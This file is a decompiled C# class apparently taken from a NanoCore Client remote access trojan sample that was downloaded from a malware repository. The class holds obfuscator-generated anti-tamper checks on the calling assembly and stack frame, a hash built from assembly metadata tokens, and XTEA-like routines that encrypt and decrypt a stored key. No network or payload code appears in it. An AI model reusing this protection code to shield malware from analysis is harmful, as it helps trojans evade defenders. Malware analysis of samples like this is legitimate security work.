// Decompiled with JetBrains decompiler
// Type: Class11
// Assembly: NanoCore Client, Version=1.2.2.0, Culture=neutral, PublicKeyToken=null
// MVID: 3E6578E1-28C0-4BF9-8DBD-C31738BD9814
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Generic-09efb455bb0ce60c3e25c3d2179b7494a69efdee0507cc96a46e1bc838d60041.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Reflection;
using System.Text;

internal static class Class11
{
  private static Class11.Class19 class19_0 = new Class11.Class19();

  internal static long smethod_0()
  {
    if ((object) Assembly.GetCallingAssembly() != (object) typeof (Class11).Assembly || !Class11.smethod_1())
      return 5038234971328056794;
    lock (Class11.class19_0)
    {
      long long_0 = Class11.class19_0.method_0();
      if (long_0 == 0L)
      {
        Assembly executingAssembly = Assembly.GetExecutingAssembly();
        List<byte> byteList = new List<byte>();
        AssemblyName assemblyName;
        try
        {
          assemblyName = executingAssembly.GetName();
        }
        catch
        {
          assemblyName = new AssemblyName(executingAssembly.FullName);
        }
        byte[] collection = assemblyName.GetPublicKeyToken();
        if (collection != null && collection.Length == 0)
          collection = (byte[]) null;
        if (collection != null)
          byteList.AddRange((IEnumerable<byte>) collection);
        byteList.AddRange((IEnumerable<byte>) Encoding.Unicode.GetBytes(assemblyName.Name));
        int num1 = Class11.smethod_3(typeof (Class11));
        int num2 = Class11.Class17.smethod_0();
        byteList.Add((byte) (num1 >> 24));
        byteList.Add((byte) (num2 >> 16));
        byteList.Add((byte) (num1 >> 8));
        byteList.Add((byte) num2);
        byteList.Add((byte) (num1 >> 16));
        byteList.Add((byte) (num2 >> 8));
        byteList.Add((byte) num1);
        byteList.Add((byte) (num2 >> 24));
        int count = byteList.Count;
        ulong num3 = 0;
        for (int index = 0; index != count; ++index)
        {
          ulong num4 = num3 + (ulong) byteList[index];
          ulong num5 = num4 + (num4 << 20);
          num3 = num5 ^ num5 >> 12;
          byteList[index] = (byte) 0;
        }
        ulong num6 = num3 + (num3 << 6);
        ulong num7 = num6 ^ num6 >> 22;
        long_0 = (long) (num7 + (num7 << 30)) ^ 8494945492412606243L;
        Class11.class19_0.method_1(long_0);
      }
      return long_0;
    }
  }

  private static bool smethod_1() => Class11.smethod_2();

  private static bool smethod_2()
  {
    StackFrame frame = new StackTrace().GetFrame(3);
    MethodBase methodBase = frame == null ? (MethodBase) null : frame.GetMethod();
    Type type = (object) methodBase == null ? (Type) null : methodBase.DeclaringType;
    return (object) type != (object) typeof (RuntimeMethodHandle) && (object) type != null && (object) type.Assembly == (object) typeof (Class11).Assembly;
  }

  private static int smethod_3(Type type_0) => type_0.MetadataToken;

  private sealed class Class12
  {
    internal static int smethod_0() => Class11.Class15.smethod_0(Class11.smethod_3(typeof (Class11.Class12)), Class11.Class15.smethod_2(Class11.Class15.smethod_1(Class11.smethod_3(typeof (Class11.Class16)), Class11.smethod_3(typeof (Class11.Class17))), Class11.Class15.smethod_2(Class11.smethod_3(typeof (Class11.Class13)) ^ 30560526, Class11.Class16.smethod_0())));
  }

  private sealed class Class13
  {
    internal static int smethod_0() => Class11.Class15.smethod_2(Class11.Class15.smethod_0(Class11.Class14.smethod_0() ^ 527758446, Class11.smethod_3(typeof (Class11.Class18))), Class11.Class15.smethod_1(Class11.smethod_3(typeof (Class11.Class17)) ^ Class11.smethod_3(typeof (Class11.Class12)), 365557629));
  }

  private sealed class Class14
  {
    internal static int smethod_0() => Class11.Class15.smethod_0(Class11.smethod_3(typeof (Class11.Class13)), Class11.smethod_3(typeof (Class11.Class18)) ^ Class11.Class15.smethod_1(Class11.smethod_3(typeof (Class11.Class14)), Class11.Class15.smethod_2(Class11.smethod_3(typeof (Class11.Class12)), Class11.Class18.smethod_0())));
  }

  private static class Class15
  {
    internal static int smethod_0(int int_0, int int_1) => int_0 ^ int_1 - -1406785609;

    internal static int smethod_1(int int_0, int int_1) => int_0 - -1320418448 ^ int_1 + 1040853010;

    internal static int smethod_2(int int_0, int int_1) => int_0 ^ int_1 - 1570757119 ^ int_0 - int_1;
  }

  private sealed class Class16
  {
    internal static int smethod_0() => Class11.Class15.smethod_1(Class11.Class15.smethod_1(Class11.Class13.smethod_0(), Class11.Class15.smethod_0(Class11.smethod_3(typeof (Class11.Class16)), Class11.Class14.smethod_0())), Class11.smethod_3(typeof (Class11.Class12)));
  }

  private sealed class Class17
  {
    internal static int smethod_0() => Class11.Class15.smethod_2(Class11.Class15.smethod_1(Class11.smethod_3(typeof (Class11.Class14)), Class11.Class15.smethod_2(Class11.smethod_3(typeof (Class11.Class17)), Class11.smethod_3(typeof (Class11.Class16)))), Class11.Class12.smethod_0());
  }

  private sealed class Class18
  {
    internal static int smethod_0() => Class11.Class15.smethod_2(Class11.smethod_3(typeof (Class11.Class18)), Class11.Class15.smethod_0(Class11.smethod_3(typeof (Class11.Class17)), Class11.Class15.smethod_1(Class11.smethod_3(typeof (Class11.Class14)), Class11.Class15.smethod_2(Class11.smethod_3(typeof (Class11.Class13)), Class11.Class15.smethod_0(Class11.smethod_3(typeof (Class11.Class16)), Class11.smethod_3(typeof (Class11.Class12)))))));
  }

  private sealed class Class19
  {
    private int int_0;
    private int int_1;

    internal Class19() => this.method_1(0L);

    internal long method_0()
    {
      if ((object) Assembly.GetCallingAssembly() != (object) typeof (Class11.Class19).Assembly || !Class11.smethod_1())
        return 2918384;
      int[] numArray = new int[4]{ 0, 0, 0, 1945488948 };
      numArray[1] = -1641090041;
      numArray[2] = -860348197;
      numArray[0] = 1249369803;
      int int0 = this.int_0;
      int int1 = this.int_1;
      int num1 = -1640531527;
      int num2 = -957401312;
      for (int index = 0; index != 32; ++index)
      {
        int1 -= (int0 << 4 ^ int0 >> 5) + int0 ^ num2 + numArray[num2 >> 11 & 3];
        num2 -= num1;
        int0 -= (int1 << 4 ^ int1 >> 5) + int1 ^ num2 + numArray[num2 & 3];
      }
      for (int index = 0; index != 4; ++index)
        numArray[index] = 0;
      return (long) ((ulong) int1 << 32 | (ulong) (uint) int0);
    }

    internal void method_1(long long_0)
    {
      if ((object) Assembly.GetCallingAssembly() != (object) typeof (Class11.Class19).Assembly || !Class11.smethod_1())
        return;
      int[] numArray = new int[4]{ 0, -1641090041, 0, 0 };
      numArray[0] = 1249369803;
      numArray[2] = -860348197;
      numArray[3] = 1945488948;
      int num1 = -1640531527;
      int num2 = (int) long_0;
      int num3 = (int) (long_0 >> 32);
      int num4 = 0;
      for (int index = 0; index != 32; ++index)
      {
        num2 += (num3 << 4 ^ num3 >> 5) + num3 ^ num4 + numArray[num4 & 3];
        num4 += num1;
        num3 += (num2 << 4 ^ num2 >> 5) + num2 ^ num4 + numArray[num4 >> 11 & 3];
      }
      for (int index = 0; index != 4; ++index)
        numArray[index] = 0;
      this.int_0 = num2;
      this.int_1 = num3;
    }
  }
}
